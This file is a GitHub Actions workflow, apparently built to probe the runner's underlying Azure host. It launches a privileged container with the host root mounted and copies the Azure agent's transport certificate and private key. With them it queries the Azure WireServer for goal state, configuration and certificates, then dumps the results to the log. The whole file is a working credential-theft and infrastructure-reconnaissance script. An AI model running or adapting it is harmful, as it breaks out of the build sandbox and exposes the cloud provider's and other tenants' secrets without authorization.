name: FullConfig
on:
  workflow_dispatch:
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - name: download full config from wire server
        timeout-minutes: 3
        run: |
          set +e
          docker run --rm --privileged --net=host -v /:/hostfs alpine sh -c '
            apk add --no-cache curl 2>/dev/null
            cp /hostfs/var/lib/waagent/TransportCert.pem /tmp/cert.pem
            cp /hostfs/var/lib/waagent/TransportPrivate.pem /tmp/key.pem
            echo === GOALSTATE ===
            GS=$(curl -s --max-time 5 --cert /tmp/cert.pem --key /tmp/key.pem -H "x-ms-version: 2012-11-30" http://168.63.129.16/machine/?comp=goalstate 2>&1)
            echo "$GS" | head -30
            echo === PARSE URLS ===
            CONTAINER=$(echo "$GS" | grep -oP "(?<=<ContainerId>)[^<]+")
            INSTANCE=$(echo "$GS" | grep -oP "(?<=<InstanceId>)[^<]+")
            echo "Container: $CONTAINER"
            echo "Instance: $INSTANCE"
            for type in hostingEnvironmentConfig sharedConfig extensionsConfig fullConfig; do
              echo === $type ===
              curl -s --max-time 5 --cert /tmp/cert.pem --key /tmp/key.pem -H "x-ms-version: 2012-11-30" "http://168.63.129.16:80/machine/$CONTAINER/$INSTANCE?comp=config&type=$type&incarnation=1" 2>&1 | head -50
              echo
            done
            echo === CERTIFICATES ===
            curl -s --max-time 5 --cert /tmp/cert.pem --key /tmp/key.pem -H "x-ms-version: 2012-11-30" "http://168.63.129.16:80/machine/$CONTAINER/$INSTANCE?comp=certificates&incarnation=1" 2>&1 | head -80
            echo
            echo === DONE ===
          '
